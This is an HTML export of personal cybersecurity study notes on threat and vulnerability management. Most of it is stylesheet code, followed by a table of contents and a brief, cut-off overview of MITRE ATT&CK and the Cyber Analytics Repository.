<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>

<link href='https://fonts.loli.net/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext' rel='stylesheet' type='text/css' /><style type='text/css'>html {overflow-x: initial !important;}:root { --bg-color:#ffffff; --text-color:#333333; --select-text-bg-color:#B5D6FC; --select-text-font-color:auto; --monospace:"Lucida Console",Consolas,"Courier",monospace; --title-bar-height:20px; }
.mac-os-11 { --title-bar-height:28px; }
html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; tab-size: 4; }
iframe { margin: auto; }
a.url { word-break: break-all; }
a:active, a:hover { outline: 0px; }
.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
#write.first-line-indent p { text-indent: 2em; }
#write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; }
#write.first-line-indent li { margin-left: 2em; }
.for-image #write { padding-left: 8px; padding-right: 8px; }
body.typora-export { padding-left: 30px; padding-right: 30px; }
.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
.typora-export .task-list-item input { pointer-events: none; }
@media screen and (max-width: 500px) {
  body.typora-export { padding-left: 0px; padding-right: 0px; }
  #write { padding-left: 20px; padding-right: 20px; }
  .CodeMirror-sizer { margin-left: 0px !important; }
  .CodeMirror-gutters { display: none !important; }
}
#write li > figure:last-child { margin-bottom: 0.5rem; }
#write ol, #write ul { position: relative; }
img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
button, input, select, textarea { color: inherit; font: inherit; }
input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
*, ::after, ::before { box-sizing: border-box; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }
p { line-height: inherit; }
h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
p { orphans: 4; }
h1 { font-size: 2rem; }
h2 { font-size: 1.8rem; }
h3 { font-size: 1.6rem; }
h4 { font-size: 1.4rem; }
h5 { font-size: 1.2rem; }
h6 { font-size: 1rem; }
.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
.hidden { display: none; }
.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
a { cursor: pointer; }
sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
figure > table { margin: 0px; }
tr { break-inside: avoid; break-after: auto; }
thead { display: table-header-group; }
table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
table.md-table td { min-width: 32px; }
.CodeMirror-gutters { border-right: 0px; background-color: inherit; }
.CodeMirror-linenumber { user-select: none; }
.CodeMirror { text-align: left; }
.CodeMirror-placeholder { opacity: 0.3; }
.CodeMirror pre { padding: 0px 4px; }
.CodeMirror-lines { padding: 0px; }
div.hr:focus { cursor: none; }
#write pre { white-space: pre-wrap; }
#write.fences-no-line-wrapping pre { white-space: pre; }
#write pre.ty-contain-cm { white-space: normal; }
.CodeMirror-gutters { margin-right: 4px; }
.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
#write .md-fences.mock-cm { white-space: pre-wrap; }
.md-fences.md-fences-with-lineno { padding-left: 0px; }
#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
.CodeMirror-line, twitterwidget { break-inside: avoid; }
.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
.footnotes + .footnotes { margin-top: 0px; }
.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
li div { padding-top: 0px; }
blockquote { margin: 1rem 0px; }
li .mathjax-block, li p { margin: 0.5rem 0px; }
li blockquote { margin: 1rem 0px; }
li { margin: 0px; position: relative; }
blockquote > :last-child { margin-bottom: 0px; }
blockquote > :first-child, li > :first-child { margin-top: 0px; }
.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
#write .footnote-line { white-space: pre-wrap; }
@media print {
  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
  #write { margin-top: 0px; padding-top: 0px; border-color: transparent !important; }
  .typora-export * { -webkit-print-color-adjust: exact; }
  .typora-export #write { break-after: avoid; }
  .typora-export #write::after { height: 0px; }
  .is-mac table { break-inside: avoid; }
  .typora-export-show-outline .typora-export-sidebar { display: none; }
}
.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
a img, img a { cursor: pointer; }
pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
p > .md-image:only-child { display: inline-block; width: 100%; }
#write .MathJax_Display { margin: 0.8em 0px 0px; }
.md-math-block { width: 100%; }
.md-math-block:not(:empty)::after { display: none; }
.MathJax_ref { fill: currentcolor; }
[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
.md-task-list-item { position: relative; list-style-type: none; }
.task-list-item.md-task-list-item { padding-left: 0px; }
.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }
.math { font-size: 1rem; }
.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
.md-toc-content { position: relative; margin-left: 0px; }
.md-toc-content::after, .md-toc::after { display: none; }
.md-toc-item { display: block; color: rgb(65, 131, 196); }
.md-toc-item a { text-decoration: none; }
.md-toc-inner:hover { text-decoration: underline; }
.md-toc-inner { display: inline-block; cursor: pointer; }
.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
.md-toc-h2 .md-toc-inner { margin-left: 2em; }
.md-toc-h3 .md-toc-inner { margin-left: 4em; }
.md-toc-h4 .md-toc-inner { margin-left: 6em; }
.md-toc-h5 .md-toc-inner { margin-left: 8em; }
.md-toc-h6 .md-toc-inner { margin-left: 10em; }
@media screen and (max-width: 48em) {
  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
}
a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
.footnote-line a:not(.reversefootnote) { color: inherit; }
.md-attr { display: none; }
.md-fn-count::after { content: "."; }
code, pre, samp, tt { font-family: var(--monospace); }
kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
code { text-align: left; vertical-align: initial; }
a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
.md-diagram-panel > svg { max-width: 100%; }
[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
[lang="mermaid"] .node text { font-size: 1rem; }
table tr th { border-bottom: 0px; }
video { max-width: 100%; display: block; margin: 0px auto; }
iframe { max-width: 100%; width: 100%; border: none; }
.highlight td, .highlight tr { border: 0px; }
mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
.md-expand mark .md-meta { opacity: 0.3 !important; }
mark .md-meta { color: rgb(0, 0, 0); }
@media print {
  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
}
.md-diagram-panel .messageText { stroke: none !important; }
.md-diagram-panel .start-state { fill: var(--node-fill); }
.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
.md-fences.md-fences-math { font-size: 1em; }
.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
.md-fences-advanced:not(.md-focus) { background: inherit; }
.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
.typora-export-show-outline #write { --webkit-flex:2; flex: 2 1 0%; }
.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
@media screen and (max-width: 1024px) {
  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
}
@media screen and (max-width: 800px) {
  .typora-export-sidebar { display: none; }
}
.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; }
.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
.outline-content strong { font-weight: 400; }
.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
.outline-expander:hover::before { content: ""; }
.outline-h1 > .outline-item { padding-left: 0px; }
.outline-h2 > .outline-item { padding-left: 1em; }
.outline-h3 > .outline-item { padding-left: 2em; }
.outline-h4 > .outline-item { padding-left: 3em; }
.outline-h5 > .outline-item { padding-left: 4em; }
.outline-h6 > .outline-item { padding-left: 5em; }
.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
.outline-label:hover { text-decoration: underline; }
.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }
.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
.outline-children { display: none; }
.info-panel-tab-wrapper { display: none; }
.outline-item-open > .outline-children { display: block; }
.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }
.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
.typora-export-collapse-outline .outline-children { display: none; }
.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
.md-inline-math-container mjx-container { zoom: 0.95; }


.CodeMirror { height: auto; }
.CodeMirror.cm-s-inner { background: inherit; }
.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }
.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }
.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
.cm-negative { color: rgb(221, 68, 68); }
.cm-positive { color: rgb(34, 153, 34); }
.cm-header, .cm-strong { font-weight: 700; }
.cm-del { text-decoration: line-through; }
.cm-em { font-style: italic; }
.cm-link { text-decoration: underline; }
.cm-error { color: red; }
.cm-invalidchar { color: red; }
.cm-constant { color: rgb(38, 139, 210); }
.cm-defined { color: rgb(181, 137, 0); }
div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
.CodeMirror { position: relative; overflow: hidden; }
.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
.CodeMirror-sizer { position: relative; }
.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }
.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }
.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }
.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }
.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
.CodeMirror-lines { cursor: text; }
.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }
.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }
.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }
.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }
.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
.CodeMirror-measure pre { position: static; }
.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }
.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
.cm-searching { background: rgba(255, 255, 0, 0.4); }
span.cm-underlined { text-decoration: underline; }
span.cm-strikethrough { text-decoration: line-through; }
.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }
.cm-tw-deleted { text-decoration: line-through; }
.cm-tw-header5 { font-weight: 700; }
.cm-tw-listitem:first-child { padding-left: 10px; }
.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }
.cm-tw-underline { text-decoration: underline; }
@media print {
  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
}


:root {
    --side-bar-bg-color: #fafafa;
    --control-text-color: #777;
}

@include-when-export url(https://fonts.loli.net/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext);

/* open-sans-regular - latin-ext_latin */
  /* open-sans-italic - latin-ext_latin */
    /* open-sans-700 - latin-ext_latin */
    /* open-sans-700italic - latin-ext_latin */
  html {
    font-size: 16px;
    -webkit-font-smoothing: antialiased;
}

body {
    font-family: "Open Sans","Clear Sans", "Helvetica Neue", Helvetica, Arial, 'Segoe UI Emoji', sans-serif;
    color: rgb(51, 51, 51);
    line-height: 1.6;
}

#write {
    max-width: 860px;
  	margin: 0 auto;
  	padding: 30px;
    padding-bottom: 100px;
}

@media only screen and (min-width: 1400px) {
	#write {
		max-width: 1024px;
	}
}

@media only screen and (min-width: 1800px) {
	#write {
		max-width: 1200px;
	}
}

#write > ul:first-child,
#write > ol:first-child{
    margin-top: 30px;
}

a {
    color: #4183C4;
}
h1,
h2,
h3,
h4,
h5,
h6 {
    position: relative;
    margin-top: 1rem;
    margin-bottom: 1rem;
    font-weight: bold;
    line-height: 1.4;
    cursor: text;
}
h1:hover a.anchor,
h2:hover a.anchor,
h3:hover a.anchor,
h4:hover a.anchor,
h5:hover a.anchor,
h6:hover a.anchor {
    text-decoration: none;
}
h1 tt,
h1 code {
    font-size: inherit;
}
h2 tt,
h2 code {
    font-size: inherit;
}
h3 tt,
h3 code {
    font-size: inherit;
}
h4 tt,
h4 code {
    font-size: inherit;
}
h5 tt,
h5 code {
    font-size: inherit;
}
h6 tt,
h6 code {
    font-size: inherit;
}
h1 {
    font-size: 2.25em;
    line-height: 1.2;
    border-bottom: 1px solid #eee;
}
h2 {
    font-size: 1.75em;
    line-height: 1.225;
    border-bottom: 1px solid #eee;
}

/*@media print {
    .typora-export h1,
    .typora-export h2 {
        border-bottom: none;
        padding-bottom: initial;
    }

    .typora-export h1::after,
    .typora-export h2::after {
        content: "";
        display: block;
        height: 100px;
        margin-top: -96px;
        border-top: 1px solid #eee;
    }
}*/

h3 {
    font-size: 1.5em;
    line-height: 1.43;
}
h4 {
    font-size: 1.25em;
}
h5 {
    font-size: 1em;
}
h6 {
   font-size: 1em;
    color: #777;
}
p,
blockquote,
ul,
ol,
dl,
table{
    margin: 0.8em 0;
}
li>ol,
li>ul {
    margin: 0 0;
}
hr {
    height: 2px;
    padding: 0;
    margin: 16px 0;
    background-color: #e7e7e7;
    border: 0 none;
    overflow: hidden;
    box-sizing: content-box;
}

li p.first {
    display: inline-block;
}
ul,
ol {
    padding-left: 30px;
}
ul:first-child,
ol:first-child {
    margin-top: 0;
}
ul:last-child,
ol:last-child {
    margin-bottom: 0;
}
blockquote {
    border-left: 4px solid #dfe2e5;
    padding: 0 15px;
    color: #777777;
}
blockquote blockquote {
    padding-right: 0;
}
table {
    padding: 0;
    word-break: initial;
}
table tr {
    border: 1px solid #dfe2e5;
    margin: 0;
    padding: 0;
}
table tr:nth-child(2n),
thead {
    background-color: #f8f8f8;
}
table th {
    font-weight: bold;
    border: 1px solid #dfe2e5;
    border-bottom: 0;
    margin: 0;
    padding: 6px 13px;
}
table td {
    border: 1px solid #dfe2e5;
    margin: 0;
    padding: 6px 13px;
}
table th:first-child,
table td:first-child {
    margin-top: 0;
}
table th:last-child,
table td:last-child {
    margin-bottom: 0;
}

.CodeMirror-lines {
    padding-left: 4px;
}

.code-tooltip {
    box-shadow: 0 1px 1px 0 rgba(0,28,36,.3);
    border-top: 1px solid #eef2f2;
}

.md-fences,
code,
tt {
    border: 1px solid #e7eaed;
    background-color: #f8f8f8;
    border-radius: 3px;
    padding: 0;
    padding: 2px 4px 0px 4px;
    font-size: 0.9em;
}

code {
    background-color: #f3f4f4;
    padding: 0 2px 0 2px;
}

.md-fences {
    margin-bottom: 15px;
    margin-top: 15px;
    padding-top: 8px;
    padding-bottom: 6px;
}


.md-task-list-item > input {
  margin-left: -1.3em;
}

@media print {
    html {
        font-size: 13px;
    }
    table,
    pre {
        page-break-inside: avoid;
    }
    pre {
        word-wrap: break-word;
    }
}

.md-fences {
	background-color: #f8f8f8;
}
#write pre.md-meta-block {
	padding: 1rem;
    font-size: 85%;
    line-height: 1.45;
    background-color: #f7f7f7;
    border: 0;
    border-radius: 3px;
    color: #777777;
    margin-top: 0 !important;
}

.mathjax-block>.code-tooltip {
	bottom: .375rem;
}

.md-mathjax-midline {
    background: #fafafa;
}

#write>h3.md-focus:before{
	left: -1.5625rem;
	top: .375rem;
}
#write>h4.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
#write>h5.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
#write>h6.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
.md-image>.md-meta {
    /*border: 1px solid #ddd;*/
    border-radius: 3px;
    padding: 2px 0px 0px 4px;
    font-size: 0.9em;
    color: inherit;
}

.md-tag {
    color: #a7a7a7;
    opacity: 1;
}

.md-toc { 
    margin-top:20px;
    padding-bottom:20px;
}

.sidebar-tabs {
    border-bottom: none;
}

#typora-quick-open {
    border: 1px solid #ddd;
    background-color: #f8f8f8;
}

#typora-quick-open-item {
    background-color: #FAFAFA;
    border-color: #FEFEFE #e5e5e5 #e5e5e5 #eee;
    border-style: solid;
    border-width: 1px;
}

/** focus mode */
.on-focus-mode blockquote {
    border-left-color: rgba(85, 85, 85, 0.12);
}

header, .context-menu, .megamenu-content, footer{
    font-family: "Segoe UI", "Arial", sans-serif;
}

.file-node-content:hover .file-node-icon,
.file-node-content:hover .file-node-open-state{
    visibility: visible;
}

.mac-seamless-mode #typora-sidebar {
    background-color: #fafafa;
    background-color: var(--side-bar-bg-color);
}

.md-lang {
    color: #b4654d;
}

/*.html-for-mac {
    --item-hover-bg-color: #E6F0FE;
}*/

#md-notification .btn {
    border: 0;
}

.dropdown-menu .divider {
    border-color: #e5e5e5;
    opacity: 0.4;
}

.ty-preferences .window-content {
    background-color: #fafafa;
}

.ty-preferences .nav-group-item.active {
    color: white;
    background: #999;
}

.menu-item-container a.menu-style-btn {
    background-color: #f5f8fa;
    background-image: linear-gradient( 180deg , hsla(0, 0%, 100%, 0.8), hsla(0, 0%, 100%, 0)); 
}



</style><title>threatandvuln</title>
</head>
<body class='typora-export os-windows'><div class='typora-export-content'>
<div id='write'  class=''><h1> Threat and Vulnerability Management</h1><p><a href='index.html'><span>Home</span></a></p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n4"><a class="md-toc-inner" href="#mitre">MITRE</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n18"><a class="md-toc-inner" href="#attck">ATT&amp;CK</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n25"><a class="md-toc-inner" href="#car">CAR</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n31"><a class="md-toc-inner" href="#shield-active-defense">Shield Active Defense</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n37"><a class="md-toc-inner" href="#mitre-engenuity">MITRE Engenuity</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n49"><a class="md-toc-inner" href="#threat-intelligence-ti">Threat Intelligence (TI)</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n53"><a class="md-toc-inner" href="#nessus">Nessus</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n55"><a class="md-toc-inner" href="#install">Install</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n80"><a class="md-toc-inner" href="#yara">Yara</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n93"><a class="md-toc-inner" href="#introduction">Introduction</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n101"><a class="md-toc-inner" href="#conditions">Conditions</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n132"><a class="md-toc-inner" href="#yara-modules">YARA Modules</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n140"><a class="md-toc-inner" href="#yara-toolsscanners">Yara Tools/Scanners</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n167"><a class="md-toc-inner" href="#creating-yara-rule-with-yargen">Creating Yara rule with yarGen</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n179"><a class="md-toc-inner" href="#valhalla">Valhalla</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n184"><a class="md-toc-inner" href="#information-sharing-and-analysis-centers-isacs">Information Sharing and Analysis Centers (ISACs)</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n189"><a class="md-toc-inner" href="#threat-intelligence">Threat Intelligence</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n202"><a class="md-toc-inner" href="#threat-connect">Threat Connect</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n219"><a class="md-toc-inner" href="#alienvault-otx">AlienVault OTX</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n240"><a class="md-toc-inner" href="#using-otx-to-gather-threat-intelligence">Using OTX to gather Threat Intelligence</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n272"><a class="md-toc-inner" href="#creating-iocs-manually">Creating IOCs Manually</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n301"><a class="md-toc-inner" href="#undefined">Zero Logon</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n306"><a class="md-toc-inner" href="#machine-accounts">Machine Accounts</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n309"><a class="md-toc-inner" href="#abusing-the-vulnerability">Abusing the Vulnerability</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n312"><a class="md-toc-inner" href="#analyzing-the-ms-nrpc-logon-process">Analyzing the MS-NRPC Logon Process</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n318"><a class="md-toc-inner" href="#walkthrough">Walkthrough</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n330"><a class="md-toc-inner" href="#openvas">OpenVas</a></span></p></div><h3 id='mitre'><span>MITRE</span></h3><p><span>Most commonly associated with </span><a href='https://cve.mitre.org/'><span>CVEs</span></a><span> but also has many other areas of research such as:</span></p><ul><li><span>ATT&amp;CK</span><em><span>®</span></em><span> (</span><strong><span>Adversarial Tactics, Techniques, and Common Knowledge</span></strong><span>) Framework</span></li><li><span>CAR (</span><strong><span>Cyber Analytics Repository</span></strong><span>) Knowledge Base</span></li><li><span>SHIELD  Active Defense</span></li><li><span>AEP (</span><strong><span>ATT&amp;CK Emulation Plans</span></strong><span>)</span></li></ul><p><span>APT - Advanced Persistent Threat </span><a href='https://www.mandiant.com/resources/apt-groups'><span>(list)</span></a><span> - considered at treat group or even a country that engages in long-term attacks against organizations and/or countries.</span></p><p><span>TTP - Tactic (goal or objective), Techniques (how to achieve goals), and Procedures (how its executed)</span></p><hr /><h4 id='attck'><span>ATT&amp;CK</span></h4><p><span>Global knowledge base of adversary tactics and techniques based on real-world observations.</span></p><p><span>Navigating to their </span><a href='https://attack.mitre.org/'><span>site</span></a><span> you can see an Matrix for Enterprise section which shows 14 categories of techniques an adversary could use to perform the tactic. The categories cover the seven-stage cyber attack lifecycle. </span></p><p><span>Can be used to follow a technique, adversary, and tools used.</span></p><p><span>Several techniques have a gray clickable bar that shows sub-techniques.</span></p><p><span>You can use the </span><a href='https://mitre-attack.github.io/attack-navigator/'><span>ATT&amp;CK navigator</span></a><span> to get a simple and generic view for planning.</span></p><hr /><h4 id='car'><span>CAR</span></h4><p><span>A knowledge base of analytics. Provides a set of validated and well-explained analytics, in particular with regards to their operating theory and rationale. </span></p><p><span>Most analytics provide a query on how to search for the 